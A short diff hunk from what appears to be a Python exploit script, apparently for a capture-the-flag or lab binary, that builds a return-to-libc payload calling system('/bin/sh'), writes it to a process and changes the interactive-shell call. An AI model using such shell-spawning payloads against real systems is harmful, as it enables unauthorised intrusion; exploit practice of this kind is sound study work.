@@ -23,4 +23,4 @@ buf = libc.call(libc.addr('system'), libc.str('/bin/sh'))
 buf += libc.fill(100, buf)
 
 p.write(buf)
-p.interact()
+p.interact(0)
